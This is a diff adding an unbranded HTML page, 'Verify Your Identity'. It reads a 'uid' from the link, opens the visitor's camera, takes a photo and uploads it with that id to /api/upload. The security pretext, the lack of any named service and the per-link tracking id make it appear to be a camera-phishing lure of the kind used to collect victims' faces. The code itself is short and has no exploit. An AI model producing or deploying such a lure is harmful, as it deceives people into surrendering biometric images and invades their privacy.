@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify Your Identity</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #f0f2f5;
+      color: #111;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .card {
+      background: white;
+      padding: 30px 25px;
+      border-radius: 14px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 15px;
+      color: #333;
+    }
+
+    p {
+      font-size: 15px;
+      margin-bottom: 20px;
+      color: #666;
+    }
+
+    video {
+      border-radius: 10px;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Verify with Camera</h2>
+    <p>For your security, please allow camera access and take a photo to verify your identity.</p>
+    <video id="video" autoplay muted></video>
+    <button onclick="capture()">📸 Take Photo</button>
+    <form id="uploadForm" style="display:none;">
+      <input type="hidden" name="uid" id="uid" />
+      <input type="file" name="photo" id="photo" />
+    </form>
+  </div>
+  <div class="footer">Made with 💛 by <strong>WACIQ</strong></div>
+
+  <script>
+    const video = document.getElementById('video');
+    const uid = new URLSearchParams(window.location.search).get('uid');
+    document.getElementById('uid').value = uid;
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => video.srcObject = stream)
+      .catch(() => alert('❌ Camera access denied.'));
+
+    function capture() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        formData.append('uid', uid);
+
+        fetch('/api/upload', { method: 'POST', body: formData })
+          .then(res => res.text())
+          .then(msg => alert(msg))
+          .catch(err => alert('❌ Error sending photo: ' + err));
+      }, 'image/jpeg');
+    }
+  </script>
+</body>
+</html> 
